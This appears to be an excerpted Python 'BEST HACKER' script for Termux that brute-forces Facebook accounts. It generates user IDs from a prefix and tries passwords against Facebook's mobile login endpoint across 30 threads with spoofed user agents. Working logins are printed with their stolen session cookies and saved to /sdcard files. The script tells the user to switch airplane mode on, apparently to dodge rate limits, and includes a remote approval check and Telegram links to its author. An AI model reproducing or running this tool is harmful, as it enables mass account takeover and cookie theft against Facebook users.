 ...
 "Mozilla/5.0 (Linux; Android 11; Redmi K30i 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
  ...
  "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
   ...
   "Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.3 Mobile Safari/537.36",
       ...
       "Mozilla/5.0 (Linux; Android 9; 802SO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36;]",
...
\t\x1b[1;94m  ########      #######      ###########
\t\x1b[1;95m  ##     ##                  ##       ##
\t\x1b[1;95m  ##     ##                  ##       ##        \033[1;30mX\033[1;37
\t\x1b[1;96m  ##     ##                  ##       ##         \033[1;31m -\033[1;37m
\t\x1b[1;97m  ########                   ##       ##            \033[1;32mD \033[1;37m

\033[1;32m              \033[1;32mCREATED BY\33[0;m   :  \033[1;35mBEST\33[0;m\033[1;34m HACKER\33[0;m
\033[1;32m              \033[1;31mAUTHOR       :  \033[1;36mEdris Nabizada
\033[1;32m              \033[1;34mGITHUB       :  \033[1;33mEdrisNabizada
\033[1;32m              \033[1;35mSTATUS       :  \033[1;32mFree
\033[1;32m              \033[1;32mVIRSION      :  \033[1;36m1.0
...
def main():
    ...
    print(f"\033[1;97m[02] \033[1;92mJOIN TO BEST HACKER TELEGRAM")
    print(f"\033[1;97m[03] \033[1;92mCONTACT BY EDRIS NABIZADA (OWNER)")
    ...
    if mirwais in ["1","01"]:
        ...
        os.system("xdg-open https://t.me/Best_Hacker_420")
        main()
    elif mirwais in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/Shah.Edris.Nabizada.420")
        main()
...
def awm1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print('\033[1;32m--------------------------------------------------------------') 
        print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;93m) MODE BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
    ...
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-H-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-H-CP.txt')
...
def awm8():
    ...
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/BHOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/BHCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
			...
			'sec-ch-device-memory': '6',
			"sec-ch-prefers-color-scheme": '"light"',
            "user-agent": pro}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https://developers.facebook.com/docs/facebook-login/android&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;92mB-H-OK\033[1;97m]\033[1;96m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;94m'+coki+ ' \n '+pro+' \033[0;97m')
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mCheckpoint-B-H\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[B-H] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    ...
    httpCaht = requests.get('https://raw.githubusercontent.com/BestProfessionals/Approval/main/Hamza.txt').text
    ...
    if id in httpCaht:
      ...
      print("\33[1;37mFor Approval Contact by MR Edris Nabizada")

      print('\33[1;37m----------------------------------------------')

      print ('IF U DONT WANT TO APPROVE PLS DONT PRESS ENTER')

      input('IF U WANT TO APPROVE THEN PRESS ENTER ')

      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://t.me/Best_Hacker_420?text='+tks),approval()
